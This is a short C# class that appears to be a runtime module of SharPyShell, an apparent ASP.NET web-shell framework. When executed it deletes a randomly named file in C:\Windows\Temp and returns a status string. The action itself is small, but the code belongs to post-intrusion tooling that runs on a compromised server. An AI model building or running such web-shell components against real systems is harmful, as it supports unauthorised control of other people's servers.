
 using System;using System.IO;using System.Diagnostics;using System.Text;
 public class SharPyShell{     
     string InitFile(string path){
         string output = "{{{SharPyShellSuccess}}} File initialized correctly.";
         try{
             if(File.Exists(path))
             {
                File.Delete(path);
             }
         }
         catch (Exception e){
             output = "{{{SharPyShellError}}}\n" + e;
         }
         return output;
     }
     public byte[] ExecRuntime(){
         string output_func=InitFile(@"C:\Windows\Temp\x1fvogijp5pyzn7\tbyjzt4vw6y");
         byte[] output_func_byte=Encoding.UTF8.GetBytes(output_func);
         return(output_func_byte);
     }
  }
        